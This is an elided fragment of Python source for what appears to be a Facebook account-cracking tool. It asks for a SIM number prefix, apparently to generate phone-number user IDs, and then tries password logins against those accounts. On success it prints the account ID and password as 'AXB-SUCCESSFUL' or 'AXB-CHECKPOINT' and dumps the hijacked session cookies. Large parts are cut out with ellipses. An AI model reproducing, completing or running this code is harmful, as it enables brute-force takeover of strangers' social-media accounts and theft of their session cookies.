...
def xerx1():
	...
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (92316)')
	print(47*'-')
...
def xerx5():
	...
	os.system('clear')
	print(logo)
	print('[+] ENTER YOUR FOUR SIM CODE (92xx)')
	print(47*'-')
	code = input('[#] PUT CODE : ')
	print("")
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[AXB-SUCCESSFUL] '+cid+' | '+ps+'\33[0;97m')
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[AXB-CHECKPOINT] '+cid+' | '+ps+'\33[0;97m')
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[AXB-SUCCESSSFUL] '+cid+' | '+ps+'\33[0;97m')
				os.system('play-audio .ok.mp3')
				if 'y' in xerx_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
